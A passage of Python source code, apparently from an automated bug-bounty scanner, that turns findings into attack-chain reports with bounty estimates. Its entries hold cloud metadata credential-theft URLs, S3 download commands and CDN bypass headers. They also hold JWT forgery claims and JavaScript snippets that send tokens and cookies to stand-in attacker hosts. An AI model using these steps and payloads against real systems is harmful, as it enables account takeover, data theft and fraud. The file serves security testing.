            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "source_to_creds"},
        }]

    # ════════════════════════════════════════════════════════════════════════
    # AWS/CLOUDFRONT-SPECIFIC CHAIN HANDLERS
    # High-value attack chains for cloud environments ($10k-$50k bounties)
    # ════════════════════════════════════════════════════════════════════════

    async def _aws_credential_exploitation(self, finding: Dict, context: Dict) -> List[Dict]:
        """AWS credential exposure → Full account exploitation chain."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "aws_credential_chain",
            "name": "AWS Credentials → Account Takeover Chain",
            "severity": "CRITICAL",
            "confidence": 95,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Exposed AWS credentials can lead to complete account takeover",
            "metadata": {
                "chain_type": "aws_credential_exploitation",
                "bounty_range": "$10,000 - $50,000",
                "poc": {
                    "steps": [
                        "1. Extract AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY",
                        "2. Configure AWS CLI: aws configure",
                        "3. Enumerate permissions: aws sts get-caller-identity",
                        "4. List S3 buckets: aws s3 ls",
                        "5. Check IAM permissions: aws iam list-attached-user-policies",
                        "6. Attempt privilege escalation if IAM access",
                    ],
                    "impact": [
                        "S3 bucket access (data breach)",
                        "EC2 instance access (compute takeover)",
                        "RDS database access (data breach)",
                        "Lambda function deployment (code execution)",
                        "IAM manipulation (permanent backdoor)",
                    ],
                    "safe_mode_note": "No actual exploitation - PoC steps only",
                },
            },
        }]

    async def _cloudfront_origin_access(self, finding: Dict, context: Dict) -> List[Dict]:
        """CloudFront bypass → Direct origin server access."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        target = context.get("target", endpoint)
        return [{
            "type": "cloudfront_bypass_chain",
            "name": "CloudFront Bypass → Origin Server Access",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Bypassing CloudFront CDN to access unprotected origin server directly",
            "metadata": {
                "chain_type": "cloudfront_origin_bypass",
                "bounty_range": "$5,000 - $15,000",
                "poc": {
                    "bypass_techniques": [
                        "1. X-Forwarded-Host header injection to reach origin",
                        "2. Host header manipulation to bypass CDN routing",
                        "3. Origin IP discovery via DNS history/CT logs",
                        "4. Cache key poisoning to bypass WAF rules",
                    ],
                    "test_headers": {
                        "X-Forwarded-Host": "origin.internal.company.com",
                        "X-Original-URL": "/admin",
                        "X-Rewrite-URL": "/api/internal",
                        "Host": "origin-server.us-east-1.elb.amazonaws.com",
                    },
                    "impact": [
                        "Bypass CloudFront WAF rules",
                        "Access origin-only endpoints",
                        "Bypass rate limiting",
                        "Access internal APIs",
                    ],
                },
            },
        }]

    async def _s3_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
        """S3 misconfiguration → Data exfiltration chain."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "s3_exfiltration_chain",
            "name": "S3 Misconfiguration → Data Exfiltration",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "S3 bucket misconfiguration allows unauthorized data access",
            "metadata": {
                "chain_type": "s3_data_exfiltration",
                "bounty_range": "$5,000 - $25,000 (depends on data sensitivity)",
                "poc": {
                    "steps": [
                        "1. List bucket contents: aws s3 ls s3://bucket-name --no-sign-request",
                        "2. Download files: aws s3 cp s3://bucket-name/file.txt . --no-sign-request",
                        "3. Check for backup files, logs, configuration",
                        "4. Look for credentials, PII, sensitive business data",
                    ],
                    "common_sensitive_files": [
                        "*.env", "*.config", "*.bak", "*.sql",
                        "credentials.json", "secrets.yml",
                        "backup/*", "logs/*", "exports/*",
                    ],
                },
            },
        }]

    async def _ssrf_aws_imds_v2(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF → AWS IMDSv2 token theft (bypasses v1 protections)."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "ssrf_imdsv2_chain",
            "name": "SSRF → AWS IMDSv2 Credential Theft",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "SSRF can bypass IMDSv2 to extract temporary AWS credentials",
            "metadata": {
                "chain_type": "ssrf_aws_imdsv2",
                "bounty_range": "$15,000 - $50,000",
                "poc": {
                    "steps": [
                        "1. Get IMDSv2 token: PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)",
                        "2. Use token to access metadata: GET http://169.254.169.254/latest/meta-data/ (X-aws-ec2-metadata-token: TOKEN)",
                        "3. Get IAM role: GET /latest/meta-data/iam/security-credentials/",
                        "4. Extract credentials: GET /latest/meta-data/iam/security-credentials/ROLE_NAME",
                    ],
                    "imdsv2_bypass": "If SSRF allows custom headers, IMDSv2 can be bypassed",
                    "impact": [
                        "Temporary AWS credentials (valid 6 hours)",
                        "Access to all resources the EC2 role permits",
                        "Potential lateral movement within AWS",
                    ],
                },
            },
        }]

    async def _cloud_metadata_credential_theft(self, finding: Dict, context: Dict) -> List[Dict]:
        """Cloud metadata access → Credential extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "cloud_metadata_chain",
            "name": "Cloud Metadata → IAM Credential Extraction",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Access to cloud metadata service exposes temporary credentials",
            "metadata": {
                "chain_type": "cloud_metadata_creds",
                "poc": {
                    "aws": {
                        "metadata_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "user_data": "http://169.254.169.254/latest/user-data",
                    },
                    "gcp": {
                        "metadata_url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "required_header": "Metadata-Flavor: Google",
                    },
                    "azure": {
                        "metadata_url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                        "required_header": "Metadata: true",
                    },
                },
            },
        }]

    async def _api_key_account_takeover(self, finding: Dict, context: Dict) -> List[Dict]:
        """API key exposure → Account/service takeover."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "api_key_takeover_chain",
            "name": "API Key Exposure → Account Takeover",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Exposed API keys can lead to service/account compromise",
            "metadata": {
                "chain_type": "api_key_exploitation",
                "poc": {
                    "high_value_keys": [
                        "AWS_SECRET_ACCESS_KEY",
                        "GOOGLE_API_KEY",
                        "STRIPE_SECRET_KEY",
                        "TWILIO_AUTH_TOKEN",
                        "GITHUB_TOKEN",
                        "SENDGRID_API_KEY",
                    ],
                    "exploitation_steps": [
                        "1. Identify the service (AWS, Stripe, Twilio, etc.)",
                        "2. Test key validity with minimal API call",
                        "3. Enumerate permissions/scopes",
                        "4. Document potential impact",
                    ],
                },
            },
        }]

    async def _jwt_algorithm_confusion(self, finding: Dict, context: Dict) -> List[Dict]:
        """JWT weakness → Algorithm confusion attack."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "jwt_algo_confusion_chain",
            "name": "JWT Weakness → Algorithm Confusion Attack",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "JWT algorithm confusion allows forging valid tokens",
            "metadata": {
                "chain_type": "jwt_algorithm_confusion",
                "bounty_range": "$5,000 - $20,000",
                "poc": {
                    "attacks": [
                        {"name": "RS256 → HS256", "description": "Use public key as HMAC secret"},
                        {"name": "alg: none", "description": "Remove signature entirely"},
                        {"name": "JWK injection", "description": "Embed attacker's key in header"},
                        {"name": "jku/x5u injection", "description": "Point to attacker's key server"},
                    ],
                    "tools": ["jwt_tool", "python-jwt", "jose"],
                },
            },
        }]

    async def _jwt_privilege_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
        """JWT weakness → Forge admin tokens."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "jwt_privesc_chain",
            "name": "JWT Weakness → Admin Token Forgery",
            "severity": "CRITICAL",
            "confidence": 90,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "JWT vulnerability allows forging administrative tokens",
            "metadata": {
                "chain_type": "jwt_privilege_escalation",
                "poc": {
                    "claim_modifications": [
                        {"claim": "role", "value": "admin"},
                        {"claim": "is_admin", "value": True},
                        {"claim": "permissions", "value": ["*"]},
                        {"claim": "user_id", "value": 1},
                    ],
                },
            },
        }]

    async def _cors_credential_theft(self, finding: Dict, context: Dict) -> List[Dict]:
        """CORS misconfiguration → Steal auth tokens via XHR."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "cors_theft_chain",
            "name": "CORS Misconfiguration → Credential Theft",
            "severity": "HIGH",
            "confidence": 85,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "CORS misconfiguration allows cross-origin credential theft",
            "metadata": {
                "chain_type": "cors_credential_theft",
                "poc": {
                    "vulnerable_configs": [
                        "Access-Control-Allow-Origin: * (with credentials)",
                        "Access-Control-Allow-Origin: null",
                        "Origin reflection without validation",
                    ],
                    "exploit_template": """
fetch('https://vulnerable-api.com/user/data', {
    credentials: 'include'
}).then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data))))
""",
                },
            },
        }]

    async def _cache_stored_xss(self, finding: Dict, context: Dict) -> List[Dict]:
        """Cache poisoning → Persistent XSS via CDN cache."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "cache_xss_chain",
            "name": "Cache Poisoning → Stored XSS via CDN",
            "severity": "CRITICAL",
            "confidence": 85,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Cache poisoning combined with XSS creates persistent attack affecting all users",
            "metadata": {
                "chain_type": "cache_stored_xss",
                "bounty_range": "$10,000 - $30,000 (affects all users)",
                "poc": {
                    "technique": "Inject XSS payload via unkeyed header, cache the response",
                    "unkeyed_headers": [
                        "X-Forwarded-Host", "X-Forwarded-Scheme",
                        "X-Original-URL", "X-Rewrite-URL",
                    ],
                    "impact": "Stored XSS affecting all users who hit the cached response",
                },
            },
        }]

    async def _cache_dos_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """Cache poisoning → DoS via cached error responses."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        return [{
            "type": "cache_dos_chain",
            "name": "Cache Poisoning → DoS via Cached Errors",
            "severity": "HIGH",
            "confidence": 80,
            "matched_at": endpoint,
            "url": endpoint,
            "description": "Cache poisoning can cache error responses, causing denial of service",
            "metadata": {
                "chain_type": "cache_dos",
                "poc": {
                    "technique": "Cause 4xx/5xx error via malformed request, cache it",
                    "impact": "All users see cached error until TTL expires",
                },
            },
        }]

    async def _speculative_aws_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Speculative chain: Suggest AWS-specific attack paths based on detected technology.
        This runs even without confirmed vulnerabilities to guide testing.
        """
        target = context.get("target", "")
        technologies = context.get("technologies", [])

        attack_paths = []

        # Check if running on AWS
        is_aws = any("aws" in str(t).lower() or "cloudfront" in str(t).lower()
                     for t in technologies)

        if is_aws:
            attack_paths.append({
                "type": "speculative_aws_chain",
                "name": "AWS Environment Detected → Recommended Attack Paths",
                "severity": "INFO",
                "confidence": 60,
                "matched_at": target,
                "url": target,
                "description": "AWS/CloudFront detected. Recommended high-value attack vectors to test.",
                "metadata": {
                    "chain_type": "speculative_aws",
                    "is_speculative": True,
                    "recommended_tests": [
                        {
                            "name": "SSRF → AWS Metadata",
                            "description": "Test all URL parameters for SSRF to 169.254.169.254",
                            "bounty_potential": "$10k-$50k",
                        },
                        {
                            "name": "CloudFront Origin Bypass",
                            "description": "Test X-Forwarded-Host, Host header manipulation",
                            "bounty_potential": "$5k-$15k",
                        },
                        {
                            "name": "S3 Bucket Discovery",
                            "description": "Look for S3 references in JS, check for misconfigurations",
                            "bounty_potential": "$5k-$25k",
                        },
                        {
                            "name": "AWS Cognito Misconfiguration",
                            "description": "Check for exposed Cognito pools, self-registration issues",
                            "bounty_potential": "$3k-$10k",
                        },
                        {
                            "name": "Lambda Function URL Auth Bypass",
                            "description": "Test for unauthenticated Lambda function URLs",
                            "bounty_potential": "$5k-$15k",
                        },
                    ],
                    "safe_mode_note": "These are test recommendations, not confirmed vulnerabilities",
                },
            })

        return attack_paths

    async def _speculative_api_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Speculative chain: Suggest API-specific attack paths.
        """
        target = context.get("target", "")

        return [{
            "type": "speculative_api_chain",
            "name": "API Endpoint Detected → Recommended Attack Paths",
            "severity": "INFO",
            "confidence": 60,
            "matched_at": target,
            "url": target,
            "description": "API detected. Recommended high-value attack vectors to test.",
            "metadata": {
                "chain_type": "speculative_api",
                "is_speculative": True,
                "recommended_tests": [
                    {
                        "name": "BOLA/IDOR Testing",
                        "description": "Test all ID parameters with different user contexts",
                        "bounty_potential": "$3k-$15k",
                    },
                    {
                        "name": "Mass Assignment",
                        "description": "Add extra fields to POST/PUT requests (is_admin, role, etc.)",
                        "bounty_potential": "$3k-$10k",
                    },
                    {
                        "name": "Rate Limit Bypass",
                        "description": "Test X-Forwarded-For, IP rotation, GraphQL batching",
                        "bounty_potential": "$1k-$5k",
                    },
                    {
                        "name": "GraphQL Introspection",
                        "description": "Query __schema for full API structure",
                        "bounty_potential": "$1k-$3k",
                    },
                    {
                        "name": "JWT Vulnerabilities",
                        "description": "Test alg:none, RS256→HS256, expired token acceptance",
                        "bounty_potential": "$5k-$20k",
                    },
                ],
            },
        }]

    # ════════════════════════════════════════════════════════════════════════
    # COMMUNICATIONS API CHAIN HANDLERS (Twilio, SendGrid, Authy)
    # ════════════════════════════════════════════════════════════════════════

    async def _comms_phone_enumeration_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: Phone enumeration → Mass data collection.
        CVE-2024-39891 pattern: Authy API leaked 33M phone numbers.
        """
        url = finding.get("url") or finding.get("matched_at", "")

        return [{
            "type": "phone_enumeration_chain",
            "name": "Phone Enumeration → Mass User Data Collection",
            "severity": "HIGH",
            "confidence": 90,
            "matched_at": url,
            "url": url,
            "description": (
                "Phone number enumeration vulnerability enables mass collection "
                "of user registration data. Similar to CVE-2024-39891 which exposed "
                "33 million Twilio Authy users' phone numbers."
            ),
            "metadata": {
                "chain_type": "comms_phone_enumeration",
                "cve_reference": "CVE-2024-39891",
                "impact": [
                    "Mass collection of registered phone numbers",
                    "User privacy violation affecting millions",
                    "Enable targeted phishing/smishing attacks",
                    "SIM swapping attack preparation",
                ],
                "bounty_potential": "$5k-$15k (data exposure affecting many users)",
                "exploitation": {
                    "technique": "Iterate through phone numbers, observe different responses",
                    "automation": "Can enumerate thousands of numbers per minute",
                    "rate_limiting": "May be bypassed via distributed requests",
                },
            },
        }]

    async def _comms_sms_pumping_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: SMS abuse endpoint → Toll fraud (IRSF).
        This is Twilio's #1 financial concern - Fraud Guard saved $62.7M.
        """
        url = finding.get("url") or finding.get("matched_at", "")

        return [{
            "type": "sms_pumping_chain",
            "name": "SMS Abuse → International Revenue Share Fraud (IRSF)",
            "severity": "CRITICAL",
            "confidence": 95,
            "matched_at": url,
            "url": url,
            "description": (
                "Unprotected SMS/Voice endpoint enables toll fraud attacks. "
                "Attackers can send SMS/calls to premium rate numbers, "
                "causing massive financial damage. Twilio Fraud Guard has "
                "prevented $62.7M in fraud between June 2022-October 2024."
            ),
            "metadata": {
                "chain_type": "comms_toll_fraud",
                "attack_name": "SMS Pumping / IRSF (International Revenue Share Fraud)",
                "impact": [
                    "Direct financial loss ($10k-$1M+ per incident)",
                    "Reputation damage to the platform",
                    "Service disruption if accounts get suspended",
                    "Legal liability for fraud-related damages",
                ],
                "bounty_potential": "$10k-$50k (critical financial impact)",
                "attack_vectors": [
                    "SMS to premium rate numbers (+882, +883 prefixes)",
                    "Voice calls to international revenue share numbers",
                    "Automated registration with IRSF phone numbers",
                    "Verification code spam to expensive destinations",
                ],
                "safe_mode_note": "PHANTOM detects the vulnerability without exploitation",
            },
        }]

    async def _comms_twilio_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: Twilio credential exposure → Full account compromise.
        """
        url = finding.get("url") or finding.get("matched_at", "")
        evidence = finding.get("evidence", [])

        return [{
            "type": "twilio_credential_chain",
            "name": "Twilio Credential Exposure → Complete Account Takeover",
            "severity": "CRITICAL",
            "confidence": 100,
            "matched_at": url,
            "url": url,
            "description": (
                "Exposed Twilio credentials (Account SID/Auth Token) enable "
                "complete account takeover, including sending SMS/calls, "
                "accessing call logs, and incurring toll fraud charges."
            ),
            "metadata": {
                "chain_type": "comms_credential_takeover",
                "credential_type": "Twilio Account SID + Auth Token",
                "impact": [
                    "Send SMS/MMS as the account owner",
                    "Make/receive calls using the account",
                    "Access all call/message logs (privacy breach)",
                    "Incur unlimited toll fraud charges",
                    "Access Twilio Verify, Authy configurations",
                    "Pivot to connected services (SendGrid, Segment)",
                ],
                "bounty_potential": "$15k-$50k (full account compromise)",
                "evidence": evidence,
                "remediation": [
                    "Rotate credentials immediately",
                    "Review recent API activity for abuse",
                    "Enable API key restrictions",
                    "Set up usage alerts and limits",
                ],
            },
        }]

    async def _comms_sendgrid_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: SendGrid API key exposure → Email abuse.
        """
        url = finding.get("url") or finding.get("matched_at", "")

        return [{
            "type": "sendgrid_credential_chain",
            "name": "SendGrid API Key Exposure → Email Abuse",
            "severity": "CRITICAL",
            "confidence": 100,
            "matched_at": url,
            "url": url,
            "description": (
                "Exposed SendGrid API key enables sending emails as the "
                "legitimate domain owner, enabling sophisticated phishing attacks."
            ),
            "metadata": {
                "chain_type": "comms_sendgrid_takeover",
                "impact": [
                    "Send emails as the legitimate domain",
                    "Conduct phishing using trusted sender",
                    "Access email templates and contact lists",
                    "View email statistics and bounces",
                    "Exhaust email sending quota",
                ],
                "bounty_potential": "$10k-$25k (email abuse potential)",
            },
        }]

    async def _comms_verify_abuse_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: Verify rate limit bypass → SMS pumping + OTP brute force.
        """
        url = finding.get("url") or finding.get("matched_at", "")

        return [{
            "type": "verify_abuse_chain",
            "name": "Verify Rate Limit Bypass → SMS Pumping + OTP Brute Force",
            "severity": "HIGH",
            "confidence": 90,
            "matched_at": url,
            "url": url,
            "description": (
                "Missing rate limiting on verification endpoint enables "
                "two attack vectors: SMS pumping (toll fraud) and OTP brute force."
            ),
            "metadata": {
                "chain_type": "comms_verify_abuse",
                "attack_vectors": [
                    {
                        "name": "SMS Pumping",
                        "description": "Trigger verification to premium numbers",
                        "impact": "Direct financial loss",
                    },
                    {
                        "name": "OTP Brute Force",
                        "description": "Guess 6-digit codes (1M combinations)",
                        "impact": "Account takeover via verification bypass",
                    },
                ],
                "bounty_potential": "$5k-$15k",
            },
        }]

    async def _comms_auth_bypass_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Chain: Auth bypass via null injection → Complete authentication bypass.
        CVE-2020-24655 pattern: Authy Android PIN bypass via @null.
        """
        url = finding.get("url") or finding.get("matched_at", "")

        return [{
            "type": "auth_bypass_chain",
            "name": "Authentication Bypass via Null Injection",
            "severity": "CRITICAL",
            "confidence": 95,
            "matched_at": url,
            "url": url,
            "description": (
                "Authentication bypassed using null/empty value injection. "
                "Similar to CVE-2020-24655 which allowed Authy PIN bypass."
            ),
            "metadata": {
                "chain_type": "comms_auth_bypass",
                "cve_reference": "CVE-2020-24655",
                "impact": [
                    "Complete authentication bypass",
                    "Access to protected user accounts",
                    "2FA/MFA bypass if affects verification",
                ],
                "bounty_potential": "$10k-$50k (critical auth bypass)",
            },
        }]

    # ════════════════════════════════════════════════════════════════════════
    # CROSS-MODULE CAUSAL CHAIN HANDLERS
    # These query SharedFindingsStore for findings from OTHER modules
    # and compose them into documented, provable attack chains
    # ════════════════════════════════════════════════════════════════════════

    def _get_store(self) -> SharedFindingsStore:
        """Get SharedFindingsStore instance."""
        return SharedFindingsStore.get_instance()

    async def _xss_token_theft_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        XSS → Token Theft → Account Takeover chain.

        Queries SharedFindingsStore for JWT/session weaknesses to compose:
        - XSS + JWT in localStorage → token theft
        - XSS + cookie without HttpOnly → session hijack
        - XSS + JWT not invalidated after logout → persistent ATO
        """
        findings = []
        store = self._get_store()
        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
        xss_type = finding.get("type", "xss")
        xss_payload = finding.get("metadata", {}).get("poc", {}).get("working_payload", "<script>alert(1)</script>")

        # Check for JWT/session findings from other modules
        jwt_findings = store.get_findings_by_type(VulnType.AUTH_BYPASS)
        session_findings = [f for f in store.get_all_findings() if "session" in f.type.lower() or "jwt" in f.type.lower()]

        # Check for cookie security findings (no HttpOnly)
        cookie_findings = [f for f in store.get_all_findings() if "cookie" in f.type.lower()]
        no_httponly = any("httponly" in str(f.metadata).lower() for f in cookie_findings)

        # Build chain evidence
        chain_steps = [
            f"1. XSS confirmed at {endpoint} via {xss_type}",
            f"   Payload: {xss_payload[:100]}",
        ]

        # Token theft via localStorage
        chain_steps.append("2. Check token storage: document.cookie / localStorage.getItem('token')")

        if session_findings:
            session_info = session_findings[0]
            chain_steps.append(
                f"3. Session weakness found: {session_info.type} at {session_info.endpoint}"
            )
            chain_steps.append("4. Stolen token remains valid (no server-side invalidation)")
            chain_steps.append("5. Attacker uses stolen token → Full Account Takeover")

            findings.append({
                "type": "xss_token_ato_chain",
                "name": "XSS → Token Theft → Account Takeover (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 90,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Cross-Site Scripting at {endpoint} can steal authentication tokens. "
                    f"Combined with {session_info.type} ({session_info.endpoint}), "
                    "the stolen token remains valid indefinitely, enabling persistent account takeover."
                ),
                "metadata": {
                    "chain_type": "xss_to_ato",
                    "is_cross_module": True,
                    "chain_components": [
                        {"module": "xss", "finding": xss_type, "endpoint": endpoint},
                        {"module": "session", "finding": session_info.type, "endpoint": session_info.endpoint},
                    ],
                    "chain_steps": chain_steps,
                    "poc": {
                        "xss_payload": xss_payload,
                        "token_theft_js": "fetch('https://attacker.example.com/steal?t='+localStorage.getItem('token'))",
                        "impact": "Full account takeover - stolen token valid after logout",
                    },
                },
            })
        elif no_httponly:
            chain_steps.append("3. Cookie missing HttpOnly flag → accessible via document.cookie")
            chain_steps.append("4. XSS steals session cookie → attacker replays in new browser")

            findings.append({
                "type": "xss_cookie_theft_chain",
                "name": "XSS → Cookie Theft → Session Hijack (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 85,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Cross-Site Scripting at {endpoint} can steal session cookies "
                    "(missing HttpOnly flag). Attacker can hijack active sessions."
                ),
                "metadata": {
                    "chain_type": "xss_to_session_hijack",
                    "is_cross_module": True,
                    "chain_steps": chain_steps,
                    "poc": {
                        "xss_payload": xss_payload,
                        "cookie_theft_js": "new Image().src='https://attacker.example.com/steal?c='+document.cookie",
                    },
                },
            })
        else:
            # Standalone XSS chain suggestion (no complementary findings yet)
            findings.append({
                "type": "xss_potential_ato_chain",
                "name": "XSS → Potential Token Theft (Chain Candidate)",
                "severity": "HIGH",
                "confidence": 75,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"XSS at {endpoint} could enable token/cookie theft. "
                    "Impact depends on token storage mechanism and HttpOnly flags."
                ),
                "metadata": {
                    "chain_type": "xss_potential_ato",
                    "is_cross_module": False,
                    "poc": {
                        "xss_payload": xss_payload,
                        "manual_check": "Verify if tokens are in localStorage or cookies without HttpOnly",
                    },
                },
            })

        return findings

    async def _sqli_credential_auth_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        SQLi → Credential Extraction → Admin Login chain.

        Uses extracted_data from enhanced SQLi scanner to prove credential theft
        and link to authentication endpoints.
        """
        findings = []
        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
        extracted = context.get("sqli_extracted_data", {})
        has_creds = context.get("has_extracted_credentials", False)

        if not extracted:
            # Check finding metadata directly
            extracted = finding.get("metadata", {}).get("extracted_data", {})
            if extracted and extracted.get("sample_data"):
                for table, rows in extracted["sample_data"].items():
                    if any(col in str(rows).lower() for col in ["password", "passwd", "hash", "token"]):
                        has_creds = True
                        break

        if has_creds:
            cred_table = context.get("credential_table", "users")
            cred_data = context.get("credential_data", {})
            db_version = extracted.get("db_version", "unknown")
            tables = extracted.get("tables", [])

            findings.append({
                "type": "sqli_credential_chain",
                "name": "SQLi → Credential Extraction → Admin Authentication (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 95,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"SQL Injection at {endpoint} successfully extracted credentials "
                    f"from '{cred_table}' table (DB: {db_version}). "
                    "Extracted password hashes can be cracked for admin access."
                ),
                "metadata": {
                    "chain_type": "sqli_to_admin",
                    "is_cross_module": True,
                    "chain_steps": [
                        f"1. SQLi confirmed at {endpoint}",
                        f"2. Database identified: {db_version}",
                        f"3. Tables enumerated: {', '.join(tables[:5]) if tables else 'N/A'}",
                        f"4. Credentials extracted from '{cred_table}'",
                        "5. Password hashes cracked → admin login",
                    ],
                    "extracted_evidence": {
                        "db_version": db_version,
                        "table_count": len(tables),
                        "credential_table": cred_table,
                        "sample_data_preview": str(cred_data)[:200] if cred_data else "N/A",
                    },
                    "poc": {
                        "extraction_endpoint": endpoint,
                        "next_steps": [
                            "Crack extracted password hashes (hashcat/john)",
                            "Login to admin panel with cracked credentials",
                            "Verify privilege escalation",
                        ],
                    },
                },
            })
        elif extracted:
            # Data extracted but no credentials found
            db_version = extracted.get("db_version", "unknown")
            tables = extracted.get("tables", [])

            findings.append({
                "type": "sqli_data_breach_chain",
                "name": f"SQLi → Database Breach ({len(tables)} tables extracted)",
                "severity": "HIGH",
                "confidence": 90,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"SQL Injection at {endpoint} extracted {len(tables)} database tables. "
                    f"Database: {db_version}. Sensitive data exposure confirmed."
                ),
                "metadata": {
                    "chain_type": "sqli_data_breach",
                    "is_cross_module": True,
                    "extracted_evidence": {
                        "db_version": db_version,
                        "tables": tables[:20],
                        "sample_data": {k: str(v)[:100] for k, v in extracted.get("sample_data", {}).items()},
                    },
                },
            })

        return findings

    async def _nosql_auth_bypass_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        NoSQL Injection → Data Extraction → Auth Bypass chain.

        Uses extracted data from NoSQL $regex brute-force to prove credential theft.
        """
        findings = []
        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
        nosql_data = context.get("nosql_extracted_data", {})

        if not nosql_data:
            nosql_data = finding.get("metadata", {}).get("extracted_data", {})

        if nosql_data:
            has_email = any("email" in k.lower() for k in nosql_data)
            has_password = any("password" in k.lower() or "hash" in k.lower() for k in nosql_data)

            if has_email or has_password:
                findings.append({
                    "type": "nosql_credential_chain",
                    "name": "NoSQL Injection → Credential Extraction → Auth Bypass (Proven Chain)",
                    "severity": "CRITICAL",
                    "confidence": 90,
                    "matched_at": endpoint,
                    "url": endpoint,
                    "description": (
                        f"NoSQL Injection at {endpoint} extracted user credentials via "
                        "$regex brute-force. Extracted fields can be used for authentication bypass."
                    ),
                    "metadata": {
                        "chain_type": "nosql_to_auth_bypass",
                        "is_cross_module": True,
                        "chain_steps": [
                            f"1. NoSQL Injection confirmed at {endpoint}",
                            "2. $regex brute-force extracted user data",
                            f"3. Fields extracted: {', '.join(nosql_data.keys())}",
                            "4. Use extracted credentials for authentication bypass",
                        ],
                        "extracted_fields": list(nosql_data.keys()),
                        "poc": {
                            "technique": "$regex character-by-character brute-force",
                            "impact": "Full credential extraction and authentication bypass",
                        },
                    },
                })
        else:
            # NoSQL injection confirmed but no data extracted yet
            findings.append({
                "type": "nosql_extraction_chain",
                "name": "NoSQL Injection → Data Extraction Ready",
                "severity": "HIGH",
                "confidence": 80,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"NoSQL Injection at {endpoint} confirmed. "
                    "$regex brute-force can extract user data from MongoDB collections."
                ),
                "metadata": {
                    "chain_type": "nosql_extraction",
                    "poc": {
                        "technique": '$regex brute-force: {"email": {"$regex": "^a"}}',
                        "targets": ["email", "password", "username", "role"],
                    },
                },
            })

        return findings

    async def _session_xss_ato_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Session Weakness + XSS → Persistent Account Takeover chain.

        Queries SharedFindingsStore for XSS findings to compose with session weakness.
        """
        findings = []
        store = self._get_store()
        endpoint = finding.get("matched_at", "")
        session_type = finding.get("name", finding.get("type", "session_abuse"))

        # Query store for XSS findings
        xss_findings = store.get_findings_by_type(VulnType.XSS)
        xss_endpoints = context.get("xss_endpoints", [])

        if xss_findings or xss_endpoints:
            xss_info = xss_findings[0] if xss_findings else None
            xss_url = xss_info.endpoint if xss_info else (xss_endpoints[0]["url"] if xss_endpoints else "")

            findings.append({
                "type": "session_xss_ato_chain",
                "name": "Session Weakness + XSS → Persistent Account Takeover (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 90,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Session weakness ({session_type}) combined with XSS at {xss_url} "
                    "enables persistent account takeover. Attacker can steal tokens via XSS, "
                    "and tokens remain valid indefinitely due to missing server-side invalidation."
                ),
                "metadata": {
                    "chain_type": "session_plus_xss_ato",
                    "is_cross_module": True,
                    "chain_components": [
